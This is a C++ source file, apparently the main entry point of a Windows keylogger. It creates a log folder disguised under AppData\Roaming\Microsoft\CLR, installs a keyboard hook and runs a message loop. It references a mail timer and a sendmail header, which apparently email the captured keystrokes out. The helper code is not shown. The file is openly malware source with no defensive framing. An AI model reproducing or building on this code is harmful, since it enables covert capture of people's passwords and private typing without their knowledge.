#include <iostream>
#include <windows.h>
#include "helper.h"
#include "keyconstants.h"
#include "base64.h"
#include "IO.h"
#include "timer.h"
#include "sendmail.h"
#include "keybhook.h"


using namespace std;

int main()
{
    MSG Msg;
    //creates the log file at: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\CLR
    IO::MKDir(IO::GetOurPath(true));
    InstallHook();

    while(GetMessage(&Msg, NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
